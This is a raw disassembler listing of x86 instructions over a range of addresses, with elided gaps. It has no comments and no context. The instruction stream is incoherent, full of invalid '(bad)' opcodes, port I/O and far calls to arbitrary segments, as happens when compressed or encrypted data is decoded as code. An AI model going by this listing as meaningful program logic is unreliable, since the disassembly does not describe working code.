  426b2d:	or     dl,BYTE PTR [edx]
  426b2f:	mov    edx,0x98cec6cd
  426b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b36:	loopne 0x426ac9
  426b38:	push   0xffffff84
  426b3a:	inc    edi
  426b3b:	add    ebp,ebp
  426b3d:	dec    esp
  426b3e:	call   0x22cf:0xf4339a4a
  426b45:	cmp    DWORD PTR [ecx+0x58],esp
  426b48:	xchg   edx,eax
  426b49:	and    DWORD PTR [edi+0x2fa9e11f],edi
  426b4f:	pop    ebp
  426b50:	mov    edi,0x8defef1e
  426b55:	pushf  
  426b56:	push   edx
  426b57:	lahf   
  426b58:	in     al,0x3c
  426b5a:	xor    ebx,DWORD PTR [edi+0x44]
  426b5d:	mov    esi,DWORD PTR [edi]
  426b5f:	add    DWORD PTR [edx+0x48631806],0xffffffff
  426b66:	push   ebp
  426b67:	sbb    dh,cl
  426b69:	lea    esi,[edx-0x7f]
  426b6c:	fisttp WORD PTR [esi-0x3d]
  426b6f:	jecxz  0x426b49
  426b71:	lods   eax,DWORD PTR ds:[esi]
  426b72:	push   edi
  426b73:	js     0x426b3e
  426b75:	xchg   ebx,eax
  426b76:	in     al,dx
  426b77:	(bad)  
  426b78:	ss into 
  426b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b7b:	jbe    0x426b00
  426b7d:	sbb    al,0x56
  426b7f:	push   ds
  426b80:	cdq    
  426b81:	mov    dl,ch
  426b83:	jno    0x426b4b
  426b85:	shr    BYTE PTR [eax+ecx*2],cl
  426b88:	idiv   bl
  426b8a:	test   ebp,ebp
  426b8c:	jg     0x426b30
  426b8e:	adc    al,0x70
  426b90:	fild   QWORD PTR [ebp+ecx*2+0x7e]
  426b94:	add    al,0x18
  426b96:	inc    edx
  426b97:	scas   al,BYTE PTR es:[edi]
  426b98:	and    DWORD PTR [edx-0x41],0x77d46624
  426b9f:	imul   ebx,ebx,0x4d
  426ba2:	fwait
  426ba3:	xchg   edi,eax
  426ba4:	not    esi
  426ba6:	and    al,0x6d
  426ba8:	cwde   
  426ba9:	fisub  DWORD PTR [edx]
  426bab:	cmp    DWORD PTR [esi],esp
  426bad:	loop   0x426c1a
  426baf:	push   ss
  426bb0:	retf   0x6e3d
  426bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bb4:	call   0xe7e3:0xc3d9f7e4
  426bbb:	and    BYTE PTR [ecx],bh
  426bbd:	mov    dl,0xae
  426bbf:	dec    esi
  426bc0:	sahf   
  426bc1:	mov    esi,0x7459113c
  426bc6:	jne    0x426c2e
  426bc8:	mov    ds:0xc754dc10,eax
  426bcd:	retf   
  426bce:	pop    edx
  426bcf:	data16 aas 
  426bd1:	(bad)  
  426bd3:	pop    esp
  426bd4:	jecxz  0x426bfe
  426bd6:	jno    0x426bca
  426bd8:	aad    0x13
  426bda:	dec    esp
  426bdb:	pop    edi
  426bdc:	fdiv   QWORD PTR [ebx+ebx*8]
  426bdf:	enter  0x498a,0xb7
  426be3:	mov    edx,0x4d2c08dc
  426be8:	push   0x14ffc71e
  426bed:	jmp    DWORD PTR [eax+0x6f]
  426bf0:	cmp    eax,0x9b067bc7
  426bf5:	ins    DWORD PTR es:[edi],dx
  426bf6:	mov    dh,0xff
  426bf8:	js     0x426baf
  426bfa:	dec    ebx
  426bfb:	popa   
  426bfc:	(bad)  
  426bfd:	and    esi,DWORD PTR [eax+0x6175d53]
  426c03:	fbstp  TBYTE PTR [esi]
  426c05:	adc    DWORD PTR [eax-0x16],esi
  426c08:	fsubr  QWORD PTR [edx-0x44a2371d]
  426c0e:	test   eax,0xe706
	...
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x66adaa72
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x1a000001
  426c8d:	jb     0x426c1e
  426c8f:	adc    eax,0x8e80a76
  426c94:	clc    
  426c95:	int    0x26
  426c97:	ins    BYTE PTR es:[edi],dx
  426c98:	and    eax,0xf4a97cde
  426c9d:	or     eax,0x27c69aa2
  426ca2:	xor    BYTE PTR [esi],cl
  426ca4:	aam    0xd0
  426ca6:	popa   
  426ca7:	dec    ebp
  426ca8:	adc    cl,BYTE PTR [ebx+0x2b]
  426cab:	outs   dx,DWORD PTR ds:[esi]
  426cac:	imul   edx,DWORD PTR [ebp-0x759d8dba],0xffffffeb
  426cb3:	cmp    eax,DWORD PTR [esi]
  426cb5:	enter  0x854b,0x40
  426cb9:	adc    BYTE PTR [ebx+0x45],al
  426cbc:	rcl    DWORD PTR [esi],1
  426cbe:	outs   dx,BYTE PTR ds:[esi]
  426cbf:	dec    esp
  426cc0:	push   0x1cdc7d16
  426cc5:	loop   0x426cad
  426cc7:	mov    ch,0xfd
  426cc9:	adc    eax,0x2a8c010
  426cce:	pop    ss
  426ccf:	or     bh,BYTE PTR [ecx-0x4b]
  426cd2:	xchg   edi,eax
  426cd3:	xchg   ebp,eax
  426cd4:	pop    ss
  426cd5:	jmp    0x5a7d47b6
  426cda:	sbb    al,0x50
  426cdc:	hlt    
  426cdd:	rcl    DWORD PTR [eax-0x87cf6e4],cl
  426ce3:	mov    BYTE PTR [eax],al
  426ce5:	mov    edi,0x771aac9
  426cea:	sbb    al,0xe
  426cec:	lock sub bl,BYTE PTR [ecx-0x50104bdb]
  426cf3:	into   
  426cf4:	and    BYTE PTR [edx-0x2d],0xdf
  426cf8:	jecxz  0x426ccc
  426cfa:	mov    ch,0x4a
  426cfc:	rcr    DWORD PTR [edx-0x773429c6],0x68
  426d03:	lods   al,BYTE PTR ds:[esi]
  426d04:	pop    ecx
  426d05:	mov    WORD PTR [ebp+ecx*4+0x4a49a0f1],gs
  426d0c:	mov    eax,0x1f238010
  426d11:	sbb    eax,0xe569b208
  426d16:	pushf  
  426d17:	mov    eax,DWORD PTR [esi+ebp*2-0x2ed6bf2]
  426d1e:	fistp  DWORD PTR [eax-0x78]
  426d21:	lods   al,BYTE PTR ds:[esi]
  426d22:	push   ebp
  426d23:	add    DWORD PTR [esi-0x1a],0x61
  426d27:	hlt    
  426d28:	outs   dx,BYTE PTR ds:[esi]
  426d29:	call   0x7cf9628
  426d2e:	sub    al,BYTE PTR gs:[esi+0x2d]
  426d32:	jae    0x426d98
  426d34:	xchg   ebp,eax
  426d35:	push   esi
  426d36:	push   cs
  426d37:	cld    
  426d38:	push   ecx
  426d39:	in     al,0x1
  426d3b:	mov    ecx,0xab4e28dc
  426d40:	jb     0x426cee
  426d42:	jns    0x426d63
  426d44:	es repz dec esi
  426d47:	pop    edx
  426d48:	or     eax,0x16d39565
  426d4d:	bound  esi,QWORD PTR [ebp-0x72]
  426d50:	sbb    eax,0x91c6393f
  426d55:	adc    eax,DWORD PTR [esi]
  426d57:	in     al,0xe6
  426d59:	fwait
  426d5a:	daa    
  426d5b:	mov    esi,0x6b70cae7
  426d60:	mov    bh,0xbb
  426d62:	xor    eax,0xae5a68a9
  426d67:	adc    edi,DWORD PTR [ebx]
  426d69:	sbb    eax,0xafaaac5b
  426d6e:	mov    al,0xb3
  426d70:	ret    
  426d71:	nop
  426d72:	fmul   DWORD PTR [esi+0x29932c0a]
  426d78:	dec    esp
  426d79:	and    DWORD PTR [ebp+0x3b305380],edx
  426d7f:	fld    DWORD PTR ds:0x338e38e6
  426d85:	out    dx,al
  426d86:	jo     0x426db6
  426d88:	cmp    eax,0xccb39d15
  426d8d:	jmp    0x90633d
	...
  426df2:	add    BYTE PTR [eax],al
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0xfe0c:0xc7c2ecf9
  426e01:	mov    ds:0x9fce5654,al
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0xc4000001
  426e0d:	mov    al,ds:0x49e4781f
  426e12:	pop    ss
  426e13:	pop    ds
  426e14:	pop    ebp
  426e15:	fild   WORD PTR [ebx]
  426e17:	iret   
  426e18:	pop    ecx
  426e19:	dec    eax
  426e1a:	cmp    ch,BYTE PTR [edi+0x155288b]
  426e20:	xchg   ebx,eax
  426e21:	push   ss
  426e22:	and    ecx,DWORD PTR ds:0x8bff0204
  426e28:	cmc    
  426e29:	pop    ebx
  426e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e2b:	xor    BYTE PTR [ebp+edi*4-0x44],0xa
  426e30:	adc    al,0x45
  426e32:	pop    ebx
  426e33:	es ss mov eax,0x7f10ffcb
  426e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e3b:	outs   dx,DWORD PTR ds:[esi]
  426e3c:	pushf  
  426e3d:	jg     0x426e35
  426e3f:	mov    DWORD PTR [ebp+0xdf3e027],ecx
  426e45:	push   0x41
  426e47:	gs js  0x426ec7
  426e4a:	mov    ?,WORD PTR [esi]
  426e4c:	sti    
  426e4d:	push   eax
  426e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e4f:	dec    edi
  426e50:	xchg   edi,eax
  426e51:	xchg   esp,eax
  426e52:	xchg   bh,bl
  426e54:	mov    ah,0xa3
  426e56:	mov    esp,0xfd039b2a
  426e5b:	pop    ds
  426e5c:	cli    
  426e5d:	add    ebp,DWORD PTR [ebx+0x69989701]
  426e63:	mov    ds,ecx
  426e65:	xchg   ebx,eax
  426e66:	mov    esp,0x4821d1db
  426e6b:	mov    eax,ds:0xc30679b6
  426e70:	mov    al,0x72
  426e72:	push   eax
  426e73:	push   eax
  426e74:	jl     0x426e5b
  426e76:	mov    edx,0x55bf4a2a
  426e7b:	scas   al,BYTE PTR es:[edi]
  426e7c:	out    dx,eax
  426e7d:	mov    ecx,0xfde2661f
  426e82:	jbe    0x426e4c
  426e84:	dec    edx
  426e85:	fiadd  DWORD PTR [eax-0x40]
  426e88:	and    eax,0xdbfb39e1
  426e8d:	hlt    
  426e8e:	fsubrp st(3),st
  426e90:	retf   0xce86
  426e93:	sub    DWORD PTR [ecx],esp
  426e95:	nop
  426e96:	dec    eax
  426e97:	cmp    bh,bh
  426e99:	mov    edi,0x9474fffc
  426e9e:	pcmpeqd mm2,QWORD PTR [ebp+0x58]
  426ea2:	in     al,dx
  426ea3:	dec    ebx
  426ea4:	xchg   edi,eax
  426ea5:	and    BYTE PTR [ebp-0x2f98415b],ah
  426eab:	ret    
  426eac:	or     ch,BYTE PTR [esi-0x8]
  426eaf:	ds pop ss
  426eb1:	shl    DWORD PTR [edi+0x53],0x8
  426eb5:	add    esi,0x75
  426eb8:	call   0x6aac:0x14859dc3
  426ebf:	stc    
  426ec0:	int    0x37
  426ec2:	stos   DWORD PTR es:[edi],eax
  426ec3:	fcomip st,st(2)
  426ec5:	std    
  426ec6:	jbe    0x426e83
  426ec8:	std    
  426ec9:	addr16 xor al,0x4b
  426ecc:	mov    esi,0xf45110c4
  426ed1:	cld    
  426ed2:	call   FWORD PTR [ebx+ebp*1]
  426ed5:	jl     0x426e86
  426ed7:	gs ins BYTE PTR es:[edi],dx
  426ed9:	mov    ds:0x7ee85b70,al
  426ede:	shl    DWORD PTR [esi],1
  426ee0:	mov    ebp,0xf4e09772
  426ee5:	fistp  DWORD PTR [ebx-0x57]
  426ee8:	dec    ebx
  426ee9:	into   
  426eea:	ds call 0x7028c852
  426ef0:	lds    edx,FWORD PTR [ebp+eax*8-0x75]
  426ef4:	mov    ds:0x77ce909,eax
  426ef9:	out    0x8b,eax
  426efb:	xchg   DWORD PTR [ebx],ecx
  426efd:	mov    ah,BYTE PTR [esi+0x1be5a713]
  426f03:	and    dl,bh
  426f05:	add    BYTE PTR [ecx+0xa],dh
  426f08:	rcl    DWORD PTR [edx-0x2f74034a],cl
  426f0e:	mov    ebp,0x6d79
	...
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [eax+esi*4-0x2c99b9bc],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	pop    ebx
  426f8d:	lock push edx
  426f8f:	in     al,dx
  426f90:	out    dx,eax
  426f91:	jae    0x426f9c
  426f93:	sbb    al,0xc9
  426f95:	test   bl,ch
  426f97:	test   DWORD PTR [edi+0x61],0x97416e2
  426f9e:	xor    eax,0xf2304a06
  426fa3:	fmul   QWORD PTR [ecx-0xd]
  426fa6:	jbe    0x427009
  426fa8:	inc    esp
  426fa9:	stos   DWORD PTR es:[edi],eax
  426faa:	pop    eax
  426fab:	leave  
  426fac:	push   DWORD PTR [eax]
  426fae:	sub    DWORD PTR [ebx],edx
  426fb0:	lods   eax,DWORD PTR ds:[esi]
  426fb1:	pop    ebx
  426fb2:	ja     0x426f9c
  426fb4:	fnstsw WORD PTR [ecx-0x1320d3f7]
  426fba:	mov    bl,cl
  426fbc:	cdq    
  426fbd:	cmp    ebx,edi
  426fbf:	mov    ds:0xe1e20153,eax
  426fc4:	call   0x119e8d79
  426fc9:	mov    ds:0x645037b5,al
  426fce:	mov    bh,dl
  426fd0:	pop    ecx
  426fd1:	mov    bl,0xd9
  426fd3:	sub    esp,DWORD PTR [ebp-0x1d42f50b]
  426fd9:	push   0xc
  426fdb:	pop    edx
  426fdc:	out    0x40,eax
  426fde:	sbb    esi,edi
  426fe0:	cmc    
  426fe1:	or     DWORD PTR ds:0x1a5f1645,esp
  426fe7:	scas   al,BYTE PTR es:[edi]
  426fe8:	jno    0x426f82
  426fea:	cmc    
  426feb:	mov    ah,0xa8
  426fed:	clc    
  426fee:	ins    BYTE PTR es:[edi],dx
  426fef:	imul   edi,DWORD PTR [ecx],0xffffffe3
  426ff2:	in     eax,dx
  426ff3:	or     BYTE PTR [ebp+edx*2-0x2c0ed9d2],dh
  426ffa:	test   DWORD PTR [esi-0x7052bb74],esp
  427000:	xchg   esp,ebx
  427002:	repz test al,ch
  427005:	xlat   BYTE PTR ds:[ebx]
  427006:	shld   DWORD PTR [eax+0x25],ecx,0xdd
  42700b:	ss (bad) 
  42700d:	sub    DWORD PTR [edi],edx
  42700f:	cmp    dl,cl
  427011:	stos   DWORD PTR es:[edi],eax
  427012:	(bad)  
  427013:	shr    DWORD PTR ds:0xbc61ca0f,cl
  427019:	cmp    DWORD PTR [esi],0x55585e8f
  42701f:	adc    DWORD PTR [ecx],ebp
  427021:	inc    esi
  427022:	js     0x42703b
  427024:	ret    0xca42
  427027:	jmp    0x77d29d33
  42702c:	adc    ch,BYTE PTR [esi-0x964a9e]
  427032:	pushf  
  427033:	lods   al,BYTE PTR ds:[esi]
  427034:	mov    eax,ds:0x81ddcea5
  427039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703a:	push   ds
  42703b:	sub    eax,0xc586a300
  427040:	sbb    BYTE PTR [ecx],dl
  427042:	call   0x7bc64633
  427047:	(bad)  
  427049:	adc    al,0x89
  42704b:	inc    eax
  42704c:	or     al,BYTE PTR [ecx+eax*1+0x5a]
  427050:	in     al,dx
  427051:	enter  0x37b,0x67
  427055:	je     0x4270b8
  427057:	pop    edx
  427058:	int    0xa1
  42705a:	xchg   ebp,eax
  42705b:	sbb    eax,0x42ff4e55
  427060:	sub    eax,0xb25d7328
  427065:	pop    es
  427066:	sahf   
  427067:	js     0x426ff6
  427069:	fistp  WORD PTR [esi+eiz*2+0x0]
  42706d:	ror    DWORD PTR [edx-0x45],0xdd
  427071:	xchg   edi,eax
  427072:	sbb    eax,0xa3c8d166
  427077:	(bad)  
  427078:	sti    
  427079:	in     al,0xd7
  42707b:	pop    ebp
  42707c:	add    BYTE PTR [edx],cl
  42707e:	jmp    0x427075
  427080:	inc    ebx
  427081:	fwait
  427082:	pusha  
  427083:	jns    0x4270d0
  427085:	add    DWORD PTR [esi-0xf],0xffffff81
  427089:	adc    esi,0xed70ae4e
  42708f:	or     DWORD PTR [edi+0x0],esi
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xabfc9d96
  427102:	test   BYTE PTR ds:0x1a1d8,bl
  427108:	add    eax,0xdb000001
  42710d:	cmp    dl,bl
  42710f:	pop    edx
  427110:	mov    dh,BYTE PTR [edx]
  427112:	repz int 0x87
  427115:	loope  0x42718b
  427117:	add    esi,DWORD PTR ds:0xc29678d2
  42711d:	(bad)  
  42711e:	lods   al,BYTE PTR ds:[esi]
  42711f:	or     BYTE PTR [ebx+0x2c9eb815],dl
  427125:	jecxz  0x4270f1
  427127:	jae    0x4270ab
  427129:	scas   al,BYTE PTR es:[edi]
  42712a:	mov    BYTE PTR [edi-0x1bbcaa05],bl
  427130:	jmp    0x8323:0xef83476e
  427137:	jne    0x42713a
  427139:	test   DWORD PTR ds:0x44a3b18a,esi
  42713f:	out    0xae,al
  427141:	retf   0x189f
  427144:	push   ecx
  427145:	sbb    DWORD PTR [ebx+edx*4+0x44],esi
  427149:	(bad)  
  42714a:	or     eax,0x81bc8707
  42714f:	clc    
  427150:	(bad)  
  427151:	sbb    eax,0xb148f72c
  427156:	scas   al,BYTE PTR es:[edi]
  427157:	push   0xffffffe1
  427159:	inc    edi
  42715a:	jb     0x427133
  42715c:	shl    ebp,1
  42715e:	add    ch,dh
  427160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427161:	cwde   
  427162:	xchg   BYTE PTR es:[edx+0x41fc91cd],bh
  427169:	inc    edx
  42716a:	xchg   esi,eax
  42716b:	sbb    eax,0x7d4b8020
  427170:	push   ebp
  427171:	mov    ecx,0x39737c28
  427176:	or     dh,ah
  427178:	mov    es,edi
  42717a:	arpl   WORD PTR [eax+0x9],dx
  42717d:	xor    al,0xdd
  42717f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427180:	add    DWORD PTR [ecx+0x5e3f6c03],edi
  427186:	add    BYTE PTR [edi-0x2b],ah
  427189:	fcom   DWORD PTR [eax+0x4f5f2b2a]
  42718f:	or     BYTE PTR [edi-0x31],0xb8
  427193:	inc    esp
  427194:	xchg   ebx,eax
  427195:	mov    eax,ds:0xd5da628e
  42719a:	jp     0x4271e5
  42719c:	cdq    
  42719d:	mov    ds:0x5eb2fa01,eax
  4271a2:	pop    ecx
  4271a3:	pop    ecx
  4271a4:	jne    0x427197
  4271a6:	es mov eax,0x26856e9f
  4271ac:	cdq    
  4271ad:	in     eax,0x9e
  4271af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271b0:	mov    dh,BYTE PTR cs:[edi+0x6b7d7778]
  4271b7:	push   edi
  4271b8:	cmc    
  4271b9:	or     ebp,DWORD PTR [edi-0x5a8c22dc]
  4271bf:	inc    ebp
  4271c0:	add    eax,0x4b15324e
  4271c5:	and    al,0x83
  4271c7:	or     edi,DWORD PTR [eax-0x27]
  4271ca:	jg     0x42717c
  4271cc:	sub    esi,eax
  4271ce:	enter  0xc334,0x18
  4271d2:	sti    
  4271d3:	mov    eax,ebx
  4271d5:	push   edi
  4271d6:	mov    esi,DWORD PTR [esi]
  4271d8:	xchg   ebp,eax
  4271d9:	push   edx
  4271da:	mov    bl,0xd7
  4271dc:	bound  ecx,QWORD PTR [ebx-0x48228b66]
  4271e2:	mov    al,ds:0xd0e08284
  4271e7:	not    BYTE PTR [edi+ebp*2-0x725cb23d]
  4271ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271ef:	adc    bl,BYTE PTR [ebp-0x1c6fdc1f]
  4271f5:	idiv   BYTE PTR [ecx-0x39]
  4271f8:	loop   0x42725b
  4271fa:	mov    edx,0xf9959470
  4271ff:	dec    ebx
  427200:	mov    edi,0x16094a3f
  427205:	dec    eax
  427206:	ret    0xaf29
  427209:	cdq    
  42720a:	mov    eax,0x3bbcbcb8
  42720f:	dec    edi
  427210:	lock add BYTE PTR [eax],al
	...
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x4fba9121,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	jmp    0x427280
  42728e:	test   al,0xfa
  427290:	les    edx,FWORD PTR [ecx]
  427292:	test   BYTE PTR [edi-0x51b77ccb],ch
  427298:	imul   ebp,DWORD PTR [ecx+0x2e],0xa0a1c66e
  42729f:	test   eax,0x45382309
  4272a4:	fisubr DWORD PTR [ecx-0x31481286]
  4272aa:	xor    al,0x8a
  4272ac:	pop    ebp
  4272ad:	push   cs
  4272ae:	ins    BYTE PTR es:[edi],dx
  4272af:	in     eax,dx
  4272b0:	jmp    FWORD PTR [ebp-0x62]
  4272b3:	pop    ss
  4272b4:	or     BYTE PTR [ebx+0x19],ch
  4272b7:	cmp    bl,ah
  4272b9:	repz xchg edx,eax
  4272bb:	adc    cl,BYTE PTR [edi+0x7d]
  4272be:	cdq    
  4272bf:	sbb    eax,0x40d95ac
  4272c4:	add    ebp,DWORD PTR [ecx+0x3e]
  4272c7:	mov    bl,0x2
  4272c9:	jl     0x427312
  4272cb:	test   cl,bh
  4272cd:	sar    BYTE PTR [ebp-0x47],0xa2
  4272d1:	cmp    DWORD PTR [ebp-0x49919a0c],esi
  4272d7:	ins    DWORD PTR es:[edi],dx
  4272d8:	add    cl,BYTE PTR [ecx+edx*1]
  4272db:	mov    al,ds:0xade8c3eb
  4272e0:	sub    eax,0xdf5bdd36
  4272e5:	rcl    dl,0xf7
  4272e8:	mov    esi,0x1497b7ad
  4272ed:	cld    
  4272ee:	out    dx,eax
  4272ef:	es xchg ebp,eax
  4272f1:	xchg   ebp,eax
  4272f2:	xchg   esp,eax
  4272f3:	inc    edi
  4272f4:	call   0x356e:0x66907033
  4272fb:	and    BYTE PTR [esi+0x6e],ch
  4272fe:	in     eax,0x8f
  427300:	and    ch,BYTE PTR [edi*4+0x721a8a62]
  427307:	mov    edi,ecx
  427309:	out    dx,al
  42730a:	xor    edi,DWORD PTR [ecx+0xe]
  42730d:	sbb    eax,0xa42c14d4
  427312:	jbe    0x427393
  427314:	jo     0x4272e0
  427316:	stc    
  427317:	scas   eax,DWORD PTR es:[edi]
  427318:	and    al,0xb
  42731a:	jb     0x4272f9
  42731c:	mov    al,0x7e
  42731e:	inc    esp
  42731f:	xor    al,0x44
  427321:	cwde   
  427322:	jbe    0x427301
  427324:	xchg   edx,eax
  427325:	cld    
  427326:	das    
  427327:	cdq    
  427328:	into   
  427329:	daa    
  42732a:	shr    al,cl
  42732c:	ror    esi,1
  42732e:	frstor [edi]
  427330:	jns    0x42735f
  427332:	call   0x283a763a
  427337:	in     al,0xed
  427339:	aaa    
  42733a:	mov    cl,0xc5
  42733c:	cmp    eax,DWORD PTR [edi]
  42733e:	fisubr DWORD PTR [ebx-0x22]
  427341:	bound  edx,QWORD PTR [ebx-0x15]
  427344:	ret    
  427345:	call   0xf739:0x4bb1ba08
  42734c:	push   eax
  42734d:	add    ebp,DWORD PTR [edx-0x8a7fe1c]
  427353:	rcr    BYTE PTR [ecx+ebp*8+0x7e8042bb],cl
  42735a:	shl    bl,1
  42735c:	stc    
  42735d:	ss aas 
  42735f:	push   esi
  427360:	dec    esp
  427361:	mov    esp,0xed354f38
  427366:	enter  0xaa26,0xcd
  42736a:	jno    0x427385
  42736c:	mov    esp,0xf68f5f0f
  427371:	cli    
  427372:	out    dx,al
  427373:	mov    bh,BYTE PTR [ecx-0x7f2fbbbb]
  427379:	mov    ch,0xf2
  42737b:	pop    ebp
  42737c:	pop    esp
  42737d:	push   0x40d4e40e
  427382:	(bad)  
  427383:	pusha  
  427384:	pop    eax
  427385:	cmp    ebx,DWORD PTR [esp-0x11]
  427389:	lea    edi,[esi]
  42738b:	data16 jecxz 0x427363
  42738e:	aas    
  42738f:	ret    
  427390:	pop    DWORD PTR [eax]
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edi,ecx
  427401:	mov    esi,?
  427403:	sbb    al,0xe2
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	sbb    edx,esi
  42740e:	stos   DWORD PTR es:[edi],eax
  42740f:	lahf   
  427410:	data16 add BYTE PTR [esi+ebp*8+0x14b6adff],bl
  427418:	mov    gs,WORD PTR [edx]
  42741a:	ror    BYTE PTR [edi+0x1717079c],1
  427420:	in     al,0x82
  427422:	or     eax,0x6d5385fd
  427427:	setl   BYTE PTR [ebx-0x43a6baf2]
  42742e:	pop    ds
  42742f:	mov    DWORD PTR [ebp+eax*1+0x37],edi
  427433:	aaa    
  427434:	jns    0x427424
  427436:	imul   esp,esi,0x13
  427439:	pop    esp
  42743a:	loop   0x42744c
  42743c:	inc    ecx
  42743d:	enter  0xebd,0x60
  427441:	out    0x6c,eax
  427443:	pop    es
  427444:	fbld   TBYTE PTR [ecx-0x37d954f1]
  42744a:	in     al,dx
  42744b:	aas    
  42744c:	in     eax,0x53
  42744e:	gs pop ecx
  427450:	mov    ecx,0x92097e7d
  427455:	(bad)  
  427456:	hlt    
  427457:	outs   dx,BYTE PTR ds:[esi]
  427458:	cli    
  427459:	inc    edi
  42745a:	cmp    al,0xac
  42745c:	and    edx,ebx
  42745e:	push   ss
  42745f:	mov    al,0xd8
  427461:	jmp    0x427456
  427463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427464:	fwait
  427465:	addr16 xor esp,eax
  427468:	in     eax,dx
  427469:	or     eax,0xd69528f7
  42746e:	mov    ds:0x4e028565,al
  427473:	shr    DWORD PTR [edi+0x75],1
  427476:	jmp    0x5109:0x9e33298a
  42747d:	push   0x3b
  42747f:	jp     0x427404
  427481:	push   0xffffff86
  427483:	sbb    DWORD PTR [esi],esi
  427485:	nop
  427486:	adc    al,BYTE PTR [edx-0x6cc987e1]
  42748c:	in     eax,0x95
  42748e:	pop    ds
  42748f:	mov    bh,0xe1
  427491:	inc    eax
  427492:	cdq    
  427493:	je     0x42746c
  427495:	cmp    eax,0xd7f2a81e
  42749a:	data16 aad 0x28
  42749d:	(bad)  
  42749e:	and    eax,0x50511cc7
  4274a3:	mov    esi,0x4be4977e
  4274a8:	(bad)  
  4274a9:	sti    
  4274aa:	cmp    DWORD PTR [ebx-0x38],0xfffffffc
  4274ae:	xor    al,0x32
  4274b0:	jnp    0x4274d9
  4274b2:	mov    dh,0xfe
  4274b4:	addr16 xchg ebp,eax
  4274b6:	cmp    edx,DWORD PTR [edx]
  4274b8:	fwait
  4274b9:	mov    esi,0xab52c0f8
  4274be:	imul   edx,DWORD PTR [ecx-0x58],0xfffffff1
  4274c2:	cwde   
  4274c3:	add    eax,0xa424bfd5
  4274c8:	jg     0x42753e
  4274ca:	jecxz  0x427471
  4274cc:	or     al,0x19
  4274ce:	add    al,0xcd
  4274d0:	dec    ebp
  4274d1:	pop    ds
  4274d2:	popf   
  4274d3:	js     0x4274e5
  4274d5:	xlat   BYTE PTR ds:[ebx]
  4274d6:	pop    eax
  4274d7:	lahf   
  4274d8:	fisub  WORD PTR [edi]
  4274da:	out    dx,al
  4274db:	sbb    al,0xd2
  4274dd:	shl    DWORD PTR [eax+edx*1],1
  4274e0:	in     al,0xcf
  4274e2:	sbb    DWORD PTR [ebx+0x10],esi
  4274e5:	(bad)  
  4274e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274e7:	stos   DWORD PTR es:[edi],eax
  4274e8:	jecxz  0x42749d
  4274ea:	arpl   WORD PTR [ebx-0xe057cab],di
  4274f0:	in     al,dx
  4274f1:	xor    ecx,ecx
  4274f3:	fisttp DWORD PTR [ebp-0x68515c1d]
  4274f9:	inc    esp
  4274fa:	mov    cl,0x5a
  4274fc:	and    BYTE PTR [esi+0x3c0a90f8],bh
  427502:	(bad)  
  427503:	sub    eax,0x2da6d6f2
  427508:	shl    DWORD PTR [ecx],0x3f
  42750b:	fisttp WORD PTR [eax]
  42750d:	sub    al,0x54
  42750f:	push   edx
  427510:	test   al,0x0
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	(bad)  
  427581:	into   
  427582:	cmp    DWORD PTR [edi+eiz*8-0x5c],eax
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0x42000001
  42758d:	push   eax
  42758e:	jae    0x42755d
  427590:	lods   al,BYTE PTR ds:[esi]
  427591:	pop    edi
  427592:	sub    eax,0x9477fe0a
  427597:	in     al,dx
  427598:	js     0x427544
  42759a:	mov    eax,DWORD PTR [ebp-0x6e]
  42759d:	addr16 push es
  42759f:	shl    BYTE PTR [ecx],0x18
  4275a2:	sar    BYTE PTR [ebp+0x27],0x93
  4275a6:	enter  0xf65,0xa7
  4275aa:	data16 xlat BYTE PTR ds:[ebx]
  4275ac:	cmp    BYTE PTR [edi],bl
  4275ae:	leave  
  4275af:	ja     0x427553
  4275b1:	cld    
  4275b2:	sti    
  4275b3:	xlat   BYTE PTR cs:[ebx]
  4275b5:	ret    0x2ea3
  4275b8:	add    BYTE PTR [ecx-0x4ac8d430],0xdf
  4275bf:	pop    ebx
